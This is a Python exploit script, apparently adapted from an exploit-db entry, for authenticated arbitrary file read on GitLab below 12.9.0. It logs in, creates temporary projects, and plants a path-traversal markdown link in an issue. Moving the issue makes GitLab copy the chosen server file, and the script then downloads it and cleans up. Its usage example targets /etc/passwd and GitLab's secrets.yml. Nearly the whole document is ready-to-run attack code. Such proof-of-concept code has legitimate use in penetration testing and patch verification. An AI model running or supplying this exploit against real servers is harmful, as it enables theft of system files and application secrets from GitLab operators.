# Gitlab <12.9.0 - Arbitrary File Read (Authenticated)
# Original script from exploit-db (https://www.exploit-db.com/exploits/49076)
# Added automatic retrieving of the target file after exploitation and cleanup
# Author: erk3

# pip3 install python-gitlab

# Get an API token (https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html)
# You can create as many personal access tokens as you like from your GitLab profile.
# Sign in to GitLab.
# In the upper-right corner, click your avatar and select Settings.
# On the User Settings menu, select Access Tokens.
# Choose a name and optional expiry date for the token.
# Choose the desired scopes.
# Click the Create personal access token button.
# Save the personal access token somewhere safe :)
# If you navigate away or refresh your page, and you did not save the token, you must create a new one.

# Example: python3 gitlab-12.9.0-file-read.py -H https://gitlab.domain.com/ -u erk3 -p test1234 -t 9nsDFXshb1txxkkZAv24 -f /etc/passwd -f /etc/hosts -f /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

import urllib3
urllib3.disable_warnings()

import sys, requests, random, string, gitlab, re, argparse
from time import sleep

def authenticate(url, user, pwd):
    signin_url = url + '/users/sign_in'
    login_url = signin_url
    session = requests.Session()
    session.verify = False

    # Get token
    signin_page = session.get(signin_url).text
    for l in signin_page.split('\n'):
        m = re.search('name="authenticity_token" value="([^"]+)"', l)
        if m:
            break
    token = m.group(1) if m else None
    if not token:
        print('Unable to find the authenticity token')
        sys.exit(1)

    # Login
    data = {'user[login]': user, 'user[password]': pwd, 'authenticity_token': token}
    r = session.post(login_url, data=data)
    if r.status_code != 200:
        print('Failed to log in')
        sys.exit(1)

    return session

def rand_suffix():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(5))

def exploit(host, user, password, token, files):

    # Instantiate Gitlab object
    session = requests.Session()
    session.verify = False
    gl = gitlab.Gitlab(host, private_token=token, session=session)
    gl.auth()

    # Create temporary projects
    p1 = gl.projects.create({'name': 'name' + rand_suffix()})
    p2 = gl.projects.create({'name': 'name' + rand_suffix()})

    # Loop over files
    for i,f in enumerate(files):
        print('===== %s =====' % (f,))
        # Create new issue on project, with a markdown link pointing to arbitrary local file system with a path traversal
        i1 = p1.issues.create({'title': 'issueTitle-%d' %(i,), 'description': '![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../%s)' % (f,)})
        sleep(3)

        # Move it to second project (making the upload to happen)
        try:
            i1.move(p2.id)
        except Exception:
            # Exit
            print('Error, most likely no right to read file %s' % (f,))
            continue

        # Build the full URI to the file
        desc = p2.issues.list()[0].description
        sleep(3)
        path = desc.split('(')[1][:-1]
        file_url = host + '/%s/%s' % (user, p2.name,) + path

        # Get file
        s = authenticate(host, user, password)
        r = s.get(file_url)
        if r.status_code == 200:
            print(r.text)
        else:
            print('Error, most likely not existing file %s' % (f,))

    # Clean up
    p1.delete()
    p2.delete()

if __name__ == "__main__":

    # Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", required=True, help="The https URI to gitlab webroot")
    parser.add_argument("-u", "--user", required=True, help="The user name")
    parser.add_argument("-p", "--passwd", required=True, help="The user password")
    parser.add_argument("-t", "--token", required=True, help="The access token")
    parser.add_argument("-f", "--files", action='append', required=True, help="The absolute paths to the files on the Gitlab local system")
    args = parser.parse_args()

    # Exploit
    exploit(args.host, args.user, args.passwd, args.token, args.files)

